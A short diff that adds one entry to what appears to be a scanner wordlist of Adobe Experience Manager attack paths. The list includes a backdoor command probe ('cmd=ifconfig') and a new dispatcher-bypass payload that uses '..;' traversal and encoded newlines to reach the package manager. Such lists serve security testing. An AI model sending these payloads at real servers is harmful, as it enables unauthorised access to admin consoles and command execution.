@@ -225,3 +225,4 @@
 /bin/backdoor.html?cmd=ifconfig
 /libs/opensocial/proxy?.css
 /etc/mobile/useragent-test.html
+/content/..;/crx/packmgr/teams.jsp;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0aa.css?_dc=1615863080856&_charset_=utf-8&includeVersions=true
